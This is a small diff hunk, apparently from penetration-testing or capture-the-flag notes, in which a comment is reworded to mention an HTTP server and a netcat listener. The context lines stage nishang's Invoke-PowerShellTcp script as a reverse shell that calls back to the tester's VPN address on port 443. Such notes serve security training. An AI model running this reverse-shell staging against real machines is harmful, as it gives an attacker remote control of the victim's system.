@@ -43,7 +43,7 @@ ___
 	cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
 	echo "" > shell.ps1
 	echo "Invoke-PowerShellTcp -Reverse -IPAddress $(vpnip) -Port 443" >> shell.ps1
-	# run HTTP server
+	# run an HTTP server + start a netcat listener
 	```
 	* PowerShell command: 
 	  ```powershell 
